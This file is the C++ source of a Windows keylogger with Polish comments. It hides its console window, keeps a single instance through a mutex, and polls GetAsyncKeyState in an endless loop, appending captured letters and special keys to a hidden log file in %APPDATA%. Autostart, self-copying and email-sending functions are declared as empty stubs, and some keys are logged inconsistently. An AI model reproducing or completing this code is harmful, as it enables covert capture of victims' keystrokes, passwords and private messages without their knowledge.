#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <cstring>

using namespace std;
const string PATH_LOGS = getenv("APPDATA")+string("\\logi.txt");
void hidenConsol()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}
void saveLogs(int liczba)
{
    FILE * plik;
    plik = fopen(PATH_LOGS.c_str(), "a");
    if (plik!=NULL)
    {
        fputc((char)liczba, plik);
        fclose(plik);
    }
}
void saveSpecialSigns( const char* specjal)
{
    FILE * plik;
    plik = fopen(PATH_LOGS.c_str(), "a");
    if (plik!=NULL)
    {

        fputs(specjal, plik);
        fclose(plik);
    }
}

bool RunTest()
{
    CreateMutex(NULL, TRUE, "UNIQUE_NAME");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        return true;
    else
        return false;
}
void autoStart() //Dodawanie do auto  startu
{

}
void email() //send mail
{

}
void copiSys() //Kopiuj  do systemu
{

}
void readOut()
{
    int liczba;
    int tymczasowa;

    while(true)
    {
        //ZCZYTUJE A-Z
        for(liczba=65; liczba<91; liczba++)
        {
            tymczasowa = GetAsyncKeyState(liczba);

            if (tymczasowa==-32767 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)(liczba+32);
                saveLogs((liczba+32));

            }
            else if (tymczasowa==-32767 && GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)liczba;
                saveLogs(liczba);

            }

        }
        //LICZBY
        for(liczba=48; liczba<58; liczba++)
        {
            if (GetAsyncKeyState(liczba)==-32767)
            {
                cout << (char)liczba;

            }
        }
        //ZNAKI SPECJALNE
        if (GetAsyncKeyState(VK_SPACE)==-32767)
        {
            cout << "[SPACE]";
            saveLogs(32);

        }

        if (GetAsyncKeyState(VK_RETURN)==-32767)
        {
            char* a;
            a= "[ENTER]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_BACK)==-32767)
        {
            cout << "[BSPACE]";
            char* a;
            a= "[BS]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_CAPITAL)==-32767)
        {
            cout << "[CAPS]";
            char* a;
            a= "[CAPS]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_DELETE)==-32767)
        {
            cout << "[DEL]";
            char* a;
            a= "[DEL]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_TAB)==-32767)
        {
            cout << "[TAB]";
            char* a;
            a= "[TAB]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_ESCAPE)==-32767)
        {
            cout << "[ESC]";
            const char* a;
            a= "[ENTER]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_MENU)==-32767)
        {
            cout << "[ALT]";
            char* a;
            a= "[ALT]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_SNAPSHOT)==-32767)
        {
            cout << "[SS]";
            char* a;
            a= "[SS]";
            saveSpecialSigns(a);
        }
        if (GetAsyncKeyState(VK_TAB)==-32767)
        {
            cout << "[TAB]";
            char* a;
            a= "[TAB]";
            saveSpecialSigns(a);
        }
    }
}

int main()
{
    if(!RunTest())
    {
    hidenConsol();
    Sleep(1000);
    readOut();
    }
    return 0;
}

